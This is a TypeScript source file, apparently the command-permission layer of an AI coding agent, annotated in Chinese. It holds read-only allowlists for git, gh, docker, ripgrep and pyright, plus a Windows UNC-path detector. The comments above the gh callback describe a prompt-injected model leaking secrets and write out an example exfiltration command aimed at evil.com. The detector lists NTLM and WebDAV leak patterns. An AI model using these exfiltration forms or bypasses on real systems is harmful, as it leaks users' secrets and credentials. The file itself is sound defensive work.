// `git branch` 的 `--abbrev` 是双层防御的样板：git 用 PARSE_OPT_OPTARG 语义，只接受粘连形式 `--abbrev=N`，分离形式 `--abbrev N` 里的 N 会变成**分支名**（创建 refs/heads/N）。所以 `safeFlags` 里仍标 `number`（否则 `--abbrev=7` 会被误拒），同时在回调的 `flagsWithArgs` 里**故意删掉** `--abbrev`——回调因此把 N 看成「没有列表标志的位置参数」，判危险。单靠任何一层都不成立。
      // SECURITY: --abbrev stays 'number' so validateFlags accepts --abbrev=N
      // (attached form, safe). The DETACHED form `--abbrev N` is the bug:
      // git uses PARSE_OPT_OPTARG (optional-attached only) — detached N becomes
      // a POSITIONAL branch name, creating .git/refs/heads/N. validateFlags
      // with 'number' consumes N, but the CALLBACK below catches it: --abbrev
      // is NOT in callback's flagsWithArgs (removed), so callback sees N as a
      // positional without list flag → dangerous. Two-layer defense: validate-
      // Flags accepts both forms, callback blocks detached.
      '--abbrev': 'number',
      '--no-abbrev': 'none',
      // Filtering - these take commit/ref arguments
      '--contains': 'string',
      '--no-contains': 'string',
      '--merged': 'none', // Optional commit argument - handled in callback
      '--no-merged': 'none', // Optional commit argument - handled in callback
      '--points-at': 'string',
      // Sorting
      '--sort': 'string',
      // Note: --format is intentionally excluded as it could pose security risks
      // Show current
      '--show-current': 'none',
      '-i': 'none',
      '--ignore-case': 'none',
    },
    // Block branch creation via positional arguments (e.g., "git branch newbranch")
    // Flag validation is handled by safeFlags above
    // args is tokens after "git branch"
    additionalCommandIsDangerousCallback: (
      _rawCommand: string,
      args: string[],
    ) => {
      // Block branch creation: "git branch <name>" or "git branch <name> <start-point>"
      // Only safe uses are: "git branch" (list), "git branch -flags" (list with options),
      // or "git branch --contains/--merged/etc <ref>" (filtering)
      // Flags that require an argument
      const flagsWithArgs = new Set([
        '--contains',
        '--no-contains',
        '--points-at',
        '--sort',
        // --abbrev REMOVED: git does NOT consume detached arg (PARSE_OPT_OPTARG)
      ])
      // Flags with optional arguments (don't require, but can take one)
      const flagsWithOptionalArgs = new Set(['--merged', '--no-merged'])
      let i = 0
      let lastFlag = ''
      let seenListFlag = false
      let seenDashDash = false
      while (i < args.length) {
        const token = args[i]
        if (!token) {
          i++
          continue
        }
        // `--` ends flag parsing. `git branch -- -l` CREATES a branch named `-l`.
        if (token === '--' && !seenDashDash) {
          seenDashDash = true
          lastFlag = ''
          i++
          continue
        }
        if (!seenDashDash && token.startsWith('-')) {
          // Check for -l/--list including short-flag bundles (-li, -la, etc.)
          if (token === '--list' || token === '-l') {
            seenListFlag = true
          } else if (
            token[0] === '-' &&
            token[1] !== '-' &&
            token.length > 2 &&
            !token.includes('=') &&
            token.slice(1).includes('l')
          ) {
            seenListFlag = true
          }
          if (token.includes('=')) {
            lastFlag = token.split('=')[0] || ''
            i++
          } else if (flagsWithArgs.has(token)) {
            lastFlag = token
            i += 2
          } else {
            lastFlag = token
            i++
          }
        } else {
          // Non-flag argument (or post-`--` positional) - could be:
          // 1. A branch name (dangerous - creates a branch)
          // 2. A pattern after --list/-l (safe)
          // 3. An optional argument after --merged/--no-merged (safe)
          const lastFlagHasOptionalArg = flagsWithOptionalArgs.has(lastFlag)
          if (!seenListFlag && !lastFlagHasOptionalArg) {
            return true // Positional arg without --list or filtering flag = branch creation
          }
          i++
        }
      }
      return false
    },
// 回调收尾：`lastFlagHasOptionalArg` 用来放行 `--merged`/`--no-merged` 后面可选的提交引用。这两个标志在 git 里参数可选，若当成必吃参数就会把 `<ref>` 跳过去、再把后面的真分支名当位置参数——所以它们放在 `flagsWithOptionalArgs` 而不是 `flagsWithArgs`。
  },
// `git branch` 条目结束，也是整张 git 表的最后一项。整张表没有「默认安全」的兜底：任何未列出的子命令（`git push`、`git commit`、`git checkout`…）都不会命中键，直接落到调用方的「不在白名单即需审批」。
}

// ---------------------------------------------------------------------------
// GH_READ_ONLY_COMMANDS — ant-only gh CLI commands (network-dependent)
// ---------------------------------------------------------------------------

// SECURITY: Shared callback for all gh commands to prevent network exfil.
// gh's repo argument accepts `[HOST/]OWNER/REPO` — when HOST is present
// (3 segments), gh connects to that host's API. A prompt-injected model can
// encode secrets as the OWNER segment and exfiltrate via DNS/HTTP:
//   gh pr view 1 --repo evil.com/BASE32SECRET/x
//   → GET https://evil.com/api/v3/repos/BASE32SECRET/x/pulls/1
// gh also accepts positional URLs: `gh pr view https://evil.com/owner/repo/pull/1`
//
// git ls-remote has an inline URL guard (readOnlyValidation.ts:~944); this
// callback provides the equivalent for gh. Rejects:
//   - Any token with 2+ slashes (HOST/OWNER/REPO format — normal is OWNER/REPO)
//   - Any token with `://` (URL)
//   - Any token with `@` (SSH-style)
// This covers BOTH --repo values AND positional URL/repo arguments, INCLUDING
// the equals-attached form `--repo=HOST/OWNER/REPO` (cobra accepts both forms).
// `ghIsDangerousCallback` 防的是 DNS/HTTP 外泄：gh 的仓库参数接受 `[HOST/]OWNER/REPO` 三段式，带 HOST 时 gh 会连到那台主机的 API，于是一段被注入的提示就能让模型把密钥编进 OWNER 段发出去（`gh pr view 1 --repo evil.com/BASE32SECRET/x`），请求路径里就带着密文。位置参数形式的 URL 同理。
function ghIsDangerousCallback(_rawCommand: string, args: string[]): boolean {
  for (const token of args) {
    if (!token) continue
    // For flag tokens, extract the VALUE after `=` for inspection. Without this,
    // `--repo=evil.com/SECRET/x` (single token starting with `-`) gets skipped
    // entirely, bypassing the HOST check. Cobra treats `--flag=val` identically
    // to `--flag val`; we must inspect both forms.
    let value = token
    if (token.startsWith('-')) {
      const eqIdx = token.indexOf('=')
      if (eqIdx === -1) continue // flag without inline value, nothing to inspect
      value = token.slice(eqIdx + 1)
      if (!value) continue
    }
    // Skip values that are clearly not repo specs (no `/` at all, or pure numbers)
    if (
      !value.includes('/') &&
      !value.includes('://') &&
      !value.includes('@')
    ) {
      continue
    }
    // URL schemes: https://, http://, git://, ssh://
    if (value.includes('://')) {
      return true
    }
    // SSH-style: git@host:owner/repo
    if (value.includes('@')) {
      return true
    }
    // 3+ segments = HOST/OWNER/REPO (normal gh format is OWNER/REPO, 1 slash)
    // Count slashes: 2+ slashes means 3+ segments
    const slashCount = (value.match(/\//g) || []).length
    if (slashCount >= 2) {
      return true
    }
  }
  return false
}
// 回调四条判据，顺序即优先级：含 `://` 判 URL；含 `@` 判 SSH 形态；`s` 出现 2 次以上判三段式（正常只有 OWNER/REPO 一个）；对以 `-` 开头的 token 先剥出 `=` 之后的值再判——`--repo=evil.com/x/y` 是单 token，不剥就等于完全跳过检查。最后一点是最容易被漏的：cobra 对 `--flag=val` 与 `--flag val` 等价，校验也必须等价。

export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
  // gh pr view is read-only — displays pull request details
  'gh pr view': {
    safeFlags: {
      '--json': 'string', // JSON field selection
      '--comments': 'none', // Show comments
      '--repo': 'string', // Target repository (OWNER/REPO)
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh pr list is read-only — lists pull requests
  'gh pr list': {
    safeFlags: {
      '--state': 'string', // open, closed, merged, all
      '-s': 'string',
      '--author': 'string',
      '--assignee': 'string',
      '--label': 'string',
      '--limit': 'number',
      '-L': 'number',
      '--base': 'string',
      '--head': 'string',
      '--search': 'string',
      '--json': 'string',
      '--draft': 'none',
      '--app': 'string',
      '--repo': 'string',
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh pr diff is read-only — shows pull request diff
  'gh pr diff': {
    safeFlags: {
      '--color': 'string',
      '--name-only': 'none',
      '--patch': 'none',
      '--repo': 'string',
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh pr checks is read-only — shows CI status checks
  'gh pr checks': {
    safeFlags: {
      '--watch': 'none',
      '--required': 'none',
      '--fail-fast': 'none',
      '--json': 'string',
      '--interval': 'number',
      '--repo': 'string',
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh issue view is read-only — displays issue details
  'gh issue view': {
    safeFlags: {
      '--json': 'string',
      '--comments': 'none',
      '--repo': 'string',
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh issue list is read-only — lists issues
  'gh issue list': {
    safeFlags: {
      '--state': 'string',
      '-s': 'string',
      '--assignee': 'string',
      '--author': 'string',
      '--label': 'string',
      '--limit': 'number',
      '-L': 'number',
      '--milestone': 'string',
      '--search': 'string',
      '--json': 'string',
      '--app': 'string',
      '--repo': 'string',
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh repo view is read-only — displays repository details
  // NOTE: gh repo view uses a positional argument, not --repo/-R flags
  'gh repo view': {
    safeFlags: {
      '--json': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh run list is read-only — lists workflow runs
  'gh run list': {
    safeFlags: {
      '--branch': 'string', // Filter by branch
      '-b': 'string',
      '--status': 'string', // Filter by status
      '-s': 'string',
      '--workflow': 'string', // Filter by workflow
      '-w': 'string', // NOTE: -w is --workflow here, NOT --web (gh run list has no --web)
      '--limit': 'number', // Max results
      '-L': 'number',
      '--json': 'string', // JSON field selection
      '--repo': 'string', // Target repository
      '-R': 'string',
      '--event': 'string', // Filter by event type
      '-e': 'string',
      '--user': 'string', // Filter by user
      '-u': 'string',
      '--created': 'string', // Filter by creation date
      '--commit': 'string', // Filter by commit SHA
      '-c': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh run view is read-only — displays a workflow run's details
  'gh run view': {
    safeFlags: {
      '--log': 'none', // Show full run log
      '--log-failed': 'none', // Show log for failed steps only
      '--exit-status': 'none', // Exit with run's status code
      '--verbose': 'none', // Show job steps
      '-v': 'none', // NOTE: -v is --verbose here, NOT --web
      '--json': 'string', // JSON field selection
      '--repo': 'string', // Target repository
      '-R': 'string',
      '--job': 'string', // View a specific job by ID
      '-j': 'string',
      '--attempt': 'number', // View a specific attempt
      '-a': 'number',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh auth status is read-only — displays authentication state
  // NOTE: --show-token/-t intentionally excluded (leaks secrets)
  'gh auth status': {
    safeFlags: {
      '--active': 'none', // Display active account only
      '-a': 'none',
      '--hostname': 'string', // Check specific hostname
      '-h': 'string',
      '--json': 'string', // JSON field selection
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh pr status is read-only — shows your PRs
  'gh pr status': {
    safeFlags: {
      '--conflict-status': 'none', // Display merge conflict status
      '-c': 'none',
      '--json': 'string', // JSON field selection
      '--repo': 'string', // Target repository
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh issue status is read-only — shows your issues
  'gh issue status': {
    safeFlags: {
      '--json': 'string', // JSON field selection
      '--repo': 'string', // Target repository
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh release list is read-only — lists releases
  'gh release list': {
    safeFlags: {
      '--exclude-drafts': 'none', // Exclude draft releases
      '--exclude-pre-releases': 'none', // Exclude pre-releases
      '--json': 'string', // JSON field selection
      '--limit': 'number', // Max results
      '-L': 'number',
      '--order': 'string', // Order: asc|desc
      '-O': 'string',
      '--repo': 'string', // Target repository
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh release view is read-only — displays release details
  // NOTE: --web/-w intentionally excluded (opens browser)
  'gh release view': {
    safeFlags: {
      '--json': 'string', // JSON field selection
      '--repo': 'string', // Target repository
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh workflow list is read-only — lists workflow files
  'gh workflow list': {
    safeFlags: {
      '--all': 'none', // Include disabled workflows
      '-a': 'none',
      '--json': 'string', // JSON field selection
      '--limit': 'number', // Max results
      '-L': 'number',
      '--repo': 'string', // Target repository
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh workflow view is read-only — displays workflow summary
  // NOTE: --web/-w intentionally excluded (opens browser)
  'gh workflow view': {
    safeFlags: {
      '--ref': 'string', // Branch/tag with workflow version
      '-r': 'string',
      '--yaml': 'none', // View workflow yaml
      '-y': 'none',
      '--repo': 'string', // Target repository
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh label list is read-only — lists labels
  // NOTE: --web/-w intentionally excluded (opens browser)
  'gh label list': {
    safeFlags: {
      '--json': 'string', // JSON field selection
      '--limit': 'number', // Max results
      '-L': 'number',
      '--order': 'string', // Order: asc|desc
      '--search': 'string', // Search label names
      '-S': 'string',
      '--sort': 'string', // Sort: created|name
      '--repo': 'string', // Target repository
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh search repos is read-only — searches repositories
  // NOTE: --web/-w intentionally excluded (opens browser)
  'gh search repos': {
    safeFlags: {
      '--archived': 'none', // Filter by archived state
      '--created': 'string', // Filter by creation date
      '--followers': 'string', // Filter by followers count
      '--forks': 'string', // Filter by forks count
      '--good-first-issues': 'string', // Filter by good first issues
      '--help-wanted-issues': 'string', // Filter by help wanted issues
      '--include-forks': 'string', // Include forks: false|true|only
      '--json': 'string', // JSON field selection
      '--language': 'string', // Filter by language
      '--license': 'string', // Filter by license
      '--limit': 'number', // Max results
      '-L': 'number',
      '--match': 'string', // Restrict to field: name|description|readme
      '--number-topics': 'string', // Filter by number of topics
      '--order': 'string', // Order: asc|desc
      '--owner': 'string', // Filter by owner
      '--size': 'string', // Filter by size range
      '--sort': 'string', // Sort: forks|help-wanted-issues|stars|updated
      '--stars': 'string', // Filter by stars
      '--topic': 'string', // Filter by topic
      '--updated': 'string', // Filter by update date
      '--visibility': 'string', // Filter: public|private|internal
    },
  },
// `gh search repos` 没有挂回调，因为它没有 `--repo`/`-R`——仓库只能通过 `--owner` 这种纯值过滤参数表达，构不成 HOST 外泄通道。gh 表里凡是带 `--repo`/`-R` 的条目一律挂同一个回调，这是「按危险槽位而不是按命令挂守卫」的分法。
  // gh search issues is read-only — searches issues
  // NOTE: --web/-w intentionally excluded (opens browser)
  'gh search issues': {
    safeFlags: {
      '--app': 'string', // Filter by GitHub App author
      '--assignee': 'string', // Filter by assignee
      '--author': 'string', // Filter by author
      '--closed': 'string', // Filter by closed date
      '--commenter': 'string', // Filter by commenter
      '--comments': 'string', // Filter by comment count
      '--created': 'string', // Filter by creation date
      '--include-prs': 'none', // Include PRs in results
      '--interactions': 'string', // Filter by interactions count
      '--involves': 'string', // Filter by involvement
      '--json': 'string', // JSON field selection
      '--label': 'string', // Filter by label
      '--language': 'string', // Filter by language
      '--limit': 'number', // Max results
      '-L': 'number',
      '--locked': 'none', // Filter locked conversations
      '--match': 'string', // Restrict to field: title|body|comments
      '--mentions': 'string', // Filter by user mentions
      '--milestone': 'string', // Filter by milestone
      '--no-assignee': 'none', // Filter missing assignee
      '--no-label': 'none', // Filter missing label
      '--no-milestone': 'none', // Filter missing milestone
      '--no-project': 'none', // Filter missing project
      '--order': 'string', // Order: asc|desc
      '--owner': 'string', // Filter by owner
      '--project': 'string', // Filter by project
      '--reactions': 'string', // Filter by reaction count
      '--repo': 'string', // Filter by repository
      '-R': 'string',
      '--sort': 'string', // Sort field
      '--state': 'string', // Filter: open|closed
      '--team-mentions': 'string', // Filter by team mentions
      '--updated': 'string', // Filter by update date
      '--visibility': 'string', // Filter: public|private|internal
    },
  },
  // gh search prs is read-only — searches pull requests
  // NOTE: --web/-w intentionally excluded (opens browser)
  'gh search prs': {
    safeFlags: {
      '--app': 'string', // Filter by GitHub App author
      '--assignee': 'string', // Filter by assignee
      '--author': 'string', // Filter by author
      '--base': 'string', // Filter by base branch
      '-B': 'string',
      '--checks': 'string', // Filter by check status
      '--closed': 'string', // Filter by closed date
      '--commenter': 'string', // Filter by commenter
      '--comments': 'string', // Filter by comment count
      '--created': 'string', // Filter by creation date
      '--draft': 'none', // Filter draft PRs
      '--head': 'string', // Filter by head branch
      '-H': 'string',
      '--interactions': 'string', // Filter by interactions count
      '--involves': 'string', // Filter by involvement
      '--json': 'string', // JSON field selection
      '--label': 'string', // Filter by label
      '--language': 'string', // Filter by language
      '--limit': 'number', // Max results
      '-L': 'number',
      '--locked': 'none', // Filter locked conversations
      '--match': 'string', // Restrict to field: title|body|comments
      '--mentions': 'string', // Filter by user mentions
      '--merged': 'none', // Filter merged PRs
      '--merged-at': 'string', // Filter by merge date
      '--milestone': 'string', // Filter by milestone
      '--no-assignee': 'none', // Filter missing assignee
      '--no-label': 'none', // Filter missing label
      '--no-milestone': 'none', // Filter missing milestone
      '--no-project': 'none', // Filter missing project
      '--order': 'string', // Order: asc|desc
      '--owner': 'string', // Filter by owner
      '--project': 'string', // Filter by project
      '--reactions': 'string', // Filter by reaction count
      '--repo': 'string', // Filter by repository
      '-R': 'string',
      '--review': 'string', // Filter by review status
      '--review-requested': 'string', // Filter by review requested
      '--reviewed-by': 'string', // Filter by reviewer
      '--sort': 'string', // Sort field
      '--state': 'string', // Filter: open|closed
      '--team-mentions': 'string', // Filter by team mentions
      '--updated': 'string', // Filter by update date
      '--visibility': 'string', // Filter: public|private|internal
    },
  },
  // gh search commits is read-only — searches commits
  // NOTE: --web/-w intentionally excluded (opens browser)
  'gh search commits': {
    safeFlags: {
      '--author': 'string', // Filter by author
      '--author-date': 'string', // Filter by authored date
      '--author-email': 'string', // Filter by author email
      '--author-name': 'string', // Filter by author name
      '--committer': 'string', // Filter by committer
      '--committer-date': 'string', // Filter by committed date
      '--committer-email': 'string', // Filter by committer email
      '--committer-name': 'string', // Filter by committer name
      '--hash': 'string', // Filter by commit hash
      '--json': 'string', // JSON field selection
      '--limit': 'number', // Max results
      '-L': 'number',
      '--merge': 'none', // Filter merge commits
      '--order': 'string', // Order: asc|desc
      '--owner': 'string', // Filter by owner
      '--parent': 'string', // Filter by parent hash
      '--repo': 'string', // Filter by repository
      '-R': 'string',
      '--sort': 'string', // Sort: author-date|committer-date
      '--tree': 'string', // Filter by tree hash
      '--visibility': 'string', // Filter: public|private|internal
    },
  },
  // gh search code is read-only — searches code
  // NOTE: --web/-w intentionally excluded (opens browser)
  'gh search code': {
    safeFlags: {
      '--extension': 'string', // Filter by file extension
      '--filename': 'string', // Filter by filename
      '--json': 'string', // JSON field selection
      '--language': 'string', // Filter by language
      '--limit': 'number', // Max results
      '-L': 'number',
      '--match': 'string', // Restrict to: file|path
      '--owner': 'string', // Filter by owner
      '--repo': 'string', // Filter by repository
      '-R': 'string',
      '--size': 'string', // Filter by size range
    },
  },
}
// gh 表收尾。`gh auth status` 刻意排除 `--show-token`：它的作用就是把令牌打印出来，属于自我外泄；`gh release view`、`gh workflow view`、`gh search *` 系列则统一排除 `--web`/`-w`——那会拉起浏览器，把控制权交给用户侧的动作面。

// ---------------------------------------------------------------------------
// DOCKER_READ_ONLY_COMMANDS — docker inspect/logs read-only commands
// ---------------------------------------------------------------------------

export const DOCKER_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> =
  {
    'docker logs': {
      safeFlags: {
        '--follow': 'none',
        '-f': 'none',
        '--tail': 'string',
        '-n': 'string',
        '--timestamps': 'none',
        '-t': 'none',
        '--since': 'string',
        '--until': 'string',
        '--details': 'none',
      },
    },
    'docker inspect': {
      safeFlags: {
        '--format': 'string',
        '-f': 'string',
        '--type': 'string',
        '--size': 'none',
        '-s': 'none',
      },
    },
  }
// docker 只开 `logs` 与 `inspect` 两条读命令。`docker logs -f` 跟流、`inspect --format` 用模板取字段，都不改容器状态；`run`/`exec`/`build` 根本没有条目。

// ---------------------------------------------------------------------------
// RIPGREP_READ_ONLY_COMMANDS — rg (ripgrep) read-only search
// ---------------------------------------------------------------------------

export const RIPGREP_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> =
  {
    rg: {
      safeFlags: {
        // Pattern flags
        '-e': 'string', // Pattern to search for
        '--regexp': 'string',
        '-f': 'string', // Read patterns from file

        // Common search options
        '-i': 'none', // Case insensitive
        '--ignore-case': 'none',
        '-S': 'none', // Smart case
        '--smart-case': 'none',
        '-F': 'none', // Fixed strings
        '--fixed-strings': 'none',
        '-w': 'none', // Word regexp
        '--word-regexp': 'none',
        '-v': 'none', // Invert match
        '--invert-match': 'none',

        // Output options
        '-c': 'none', // Count matches
        '--count': 'none',
        '-l': 'none', // Files with matches
        '--files-with-matches': 'none',
        '--files-without-match': 'none',
        '-n': 'none', // Line number
        '--line-number': 'none',
        '-o': 'none', // Only matching
        '--only-matching': 'none',
        '-A': 'number', // After context
        '--after-context': 'number',
        '-B': 'number', // Before context
        '--before-context': 'number',
        '-C': 'number', // Context
        '--context': 'number',
        '-H': 'none', // With filename
        '-h': 'none', // No filename
        '--heading': 'none',
        '--no-heading': 'none',
        '-q': 'none', // Quiet
        '--quiet': 'none',
        '--column': 'none',

        // File filtering
        '-g': 'string', // Glob
        '--glob': 'string',
        '-t': 'string', // Type
        '--type': 'string',
        '-T': 'string', // Type not
        '--type-not': 'string',
        '--type-list': 'none',
        '--hidden': 'none',
        '--no-ignore': 'none',
        '-u': 'none', // Unrestricted

        // Common options
        '-m': 'number', // Max count per file
        '--max-count': 'number',
        '-d': 'number', // Max depth
        '--max-depth': 'number',
        '-a': 'none', // Text (search binary files)
        '--text': 'none',
        '-z': 'none', // Search zip
        '-L': 'none', // Follow symlinks
        '--follow': 'none',

        // Display options
        '--color': 'string',
        '--json': 'none',
        '--stats': 'none',

        // Help and version
        '--help': 'none',
        '--version': 'none',
        '--debug': 'none',

        // Special argument separator
        '--': 'none',
      },
    },
  }
// ripgrep 表把 `--` 本身也写成 `none` 类型的安全标志。这看似多余（主循环本就会在 `--` 处 break），实际是为了让「`--` 出现在某个参数值位置」时也能被正确消费，而不是被当成待校验的未知标志拒绝。

// ---------------------------------------------------------------------------
// PYRIGHT_READ_ONLY_COMMANDS — pyright static type checker
// ---------------------------------------------------------------------------

export const PYRIGHT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> =
  {
    pyright: {
      respectsDoubleDash: false, // pyright treats -- as a file path, not end-of-options
// `respectsDoubleDash: false` 是 pyright 条目的核心。pyright 把 `--` 当文件名，其后的 token 仍按标志解析；若校验器在 `--` 处 break，`pyright -- --createstub os` 就会被自动放行，而 pyright 真的会创建 stub 文件（写盘）。这个字段就是为「不遵守 POSIX 约定的工具」准备的逃生门。
      safeFlags: {
        '--outputjson': 'none',
        '--project': 'string',
        '-p': 'string',
        '--pythonversion': 'string',
        '--pythonplatform': 'string',
        '--typeshedpath': 'string',
        '--venvpath': 'string',
        '--level': 'string',
        '--stats': 'none',
        '--verbose': 'none',
        '--version': 'none',
        '--dependencies': 'none',
        '--warnings': 'none',
      },
      additionalCommandIsDangerousCallback: (
        _rawCommand: string,
        args: string[],
      ) => {
        // Check if --watch or -w appears as a standalone token (flag)
        return args.some(t => t === '--watch' || t === '-w')
      },
    },
  }
// pyright 回调只拦 `--watch`/`-w`：该模式会驻留监听文件变化，让一次「检查」变成长期进程，从而绕过工具调用的超时与收尾。

// ---------------------------------------------------------------------------
// EXTERNAL_READONLY_COMMANDS — cross-shell read-only commands
// Only commands that work identically in bash and PowerShell on Windows.
// Unix-specific commands (cat, head, wc, etc.) belong in BashTool's READONLY_COMMANDS.
// ---------------------------------------------------------------------------

export const EXTERNAL_READONLY_COMMANDS: readonly string[] = [
  // Cross-platform external tools that work the same in bash and PowerShell on Windows
  'docker ps',
  'docker images',
] as const
// `EXTERNAL_READONLY_COMMANDS` 只留 `docker ps` 与 `docker images`：这里要求的是「在 Windows 上 bash 与 PowerShell 里行为完全一致」的跨 shell 命令，任何 Unix 专有命令都归 BashTool 自己的表，不能混进来。

// ---------------------------------------------------------------------------
// UNC path detection (shared across Bash and PowerShell)
// ---------------------------------------------------------------------------

/**
 * Check if a path or command contains a UNC path that could trigger network
 * requests (NTLM/Kerberos credential leakage, WebDAV attacks).
 *
 * This function detects:
 * - Basic UNC paths: \\server\share, \\foo.com\file
 * - WebDAV patterns: \\server@SSL@8443\, \\server@8443@SSL\, \\server\DavWWWRoot\
 * - IP-based UNC: \\192.168.1.1\share, \\[2001:db8::1]\share
 * - Forward-slash variants: //server/share
 *
 * @param pathOrCommand The path or command string to check
 * @returns true if the path/command contains potentially vulnerable UNC paths
 */
// `containsVulnerableUncPath` 只在 Windows 上生效：UNC 路径会触发 SMB/WebDAV 连接，Windows 在建立连接时会自动把当前用户的 NTLM 哈希发出去——一次 `ls` 或一次路径校验就能泄露凭据。函数对「路径或整条命令字符串」都做检测，因为它既用于参数校验也用于命令文本扫描。
export function containsVulnerableUncPath(pathOrCommand: string): boolean {
  // Only check on Windows platform
  if (getPlatform() !== 'windows') {
    return false
  }

  // 1. Check for general UNC paths with backslashes
  // Pattern matches: \\server, \\server\share, \\server/share, \\server@port\share
  // Uses [^\s\\/]+ for hostname to catch Unicode homoglyphs and other non-ASCII chars
  // Trailing accepts both \ and / since Windows treats both as path separators
  const backslashUncPattern = /\\\\[^\s\\/]+(?:@(?:\d+|ssl))?(?:[\\/]|$|\s)/i
  if (backslashUncPattern.test(pathOrCommand)) {
    return true
  }
// 第一类：反斜杠 UNC。主机名的字符类刻意排除空白与两种路径分隔符，而不是只允许字母数字与点，是为了覆盖 Unicode 同形字与非常规字符——攻击者可以用形近字符构造能被系统解析、却不被朴素白名单认出的主机名。尾部同时接受两种分隔符，因为 Windows 对两者一视同仁。

  // 2. Check for forward-slash UNC paths
  // Pattern matches: //server, //server/share, //server\share, //192.168.1.1/share
  // Uses negative lookbehind (?<!:) to exclude URLs (https://, http://, ftp://)
  // while catching // preceded by quotes, =, or any other non-colon character.
  // Trailing accepts both / and \ since Windows treats both as path separators
  const forwardSlashUncPattern =
    // eslint-disable-next-line custom-rules/no-lookbehind-regex -- .test() on short command strings
    /(?<!:)\/\/[^\s\\/]+(?:@(?:\d+|ssl))?(?:[\\/]|$|\s)/i
  if (forwardSlashUncPattern.test(pathOrCommand)) {
    return true
  }
// 第二类：正斜杠 UNC，用负向后视 `(?<!:)` 排除 `https://`、`ftp://` 这类 URL——它们同样以双斜杠开头，但走的是浏览器/HTTP 栈而不是 SMB，不会自动附带凭据。副作用是该正则依赖后视支持，所以文件里对这条规则单独留了 lint 豁免。

  // 3. Check for mixed-separator UNC paths (forward slash + backslashes)
  // On Windows/Cygwin, /\ is equivalent to // since both are path separators.
  // In bash, /\\server becomes /\server after escape processing, which is a UNC path.
  // Requires 2+ backslashes after / because a single backslash just escapes the next char
  // (e.g., /\a → /a after bash processing, which is NOT a UNC path).
  const mixedSlashUncPattern = /\/\\{2,}[^\s\\/]/
  if (mixedSlashUncPattern.test(pathOrCommand)) {
    return true
  }
// 第三类：混合分隔符（一个正斜杠接两个及以上反斜杠）。这一条专门针对 bash 的转义处理：`/` 加两个反斜杠在 bash 里会变成 `/` 加一个反斜杠，到 Windows 侧就成了 UNC 路径。要求至少两个反斜杠，是因为单个反斜杠只是转义下一个字符，转完就是普通路径。

  // 4. Check for mixed-separator UNC paths (backslashes + forward slash)
  // \\/server in bash becomes \/server after escape processing, which is a UNC path
  // on Windows since both \ and / are path separators.
  const reverseMixedSlashUncPattern = /\\{2,}\/[^\s\\/]/
  if (reverseMixedSlashUncPattern.test(pathOrCommand)) {
    return true
  }
// 第四类：反向混合（两个及以上反斜杠接一个正斜杠），同样是「转义处理后变成 UNC」的变体。这两条互为镜像，缺任何一条都能被另一种写法绕过。

  // 5. Check for WebDAV SSL/port patterns
  // Examples: \\server@SSL@8443\path, \\server@8443@SSL\path
  if (/@SSL@\d+/i.test(pathOrCommand) || /@\d+@SSL/i.test(pathOrCommand)) {
    return true
  }
// 第五类：WebDAV 的 `@SSL@端口` 与 `@端口@SSL` 两种标记。它们让 Windows 的 WebDAV 重定向器去连非 445 端口，常被用来穿过只封了 SMB 的出网策略。

  // 6. Check for DavWWWRoot marker (Windows WebDAV redirector)
  // Example: \\server\DavWWWRoot\path
  if (/DavWWWRoot/i.test(pathOrCommand)) {
    return true
  }
// 第六类：`DavWWWRoot` 标记——Windows WebDAV 重定向器的固定挂载点名字，出现即说明走的是 WebDAV 而非 SMB。

  // 7. Check for UNC paths with IPv4 addresses (explicit check for defense-in-depth)
  // Examples: \\192.168.1.1\share, \\10.0.0.1\path
  if (
    /^\\\\(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})[\\/]/.test(pathOrCommand) ||
    /^\/\/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})[\\/]/.test(pathOrCommand)
  ) {
    return true
  }

  // 8. Check for UNC paths with bracketed IPv6 addresses (explicit check for defense-in-depth)
  // Examples: \\[2001:db8::1]\share, \\[::1]\path
  if (
    /^\\\\(\[[\da-fA-F:]+\])[\\/]/.test(pathOrCommand) ||
    /^\/\/(\[[\da-fA-F:]+\])[\\/]/.test(pathOrCommand)
  ) {
    return true
  }
// 第七、八类是对 IPv4 与方括号 IPv6 字面量的**显式**检查。前六条正则理论上已能覆盖它们，这里仍单独列出，属于纵深防御：地址字面量是最容易被机器生成的形态，独立规则便于日后收紧（例如只允许私网段）而不牵动通用正则。

  return false
}

// ---------------------------------------------------------------------------
// Flag validation utilities
// ---------------------------------------------------------------------------

// Regex pattern to match valid flag names (letters, digits, underscores, hyphens)
export const FLAG_PATTERN = /^-[a-zA-Z0-9_-]/
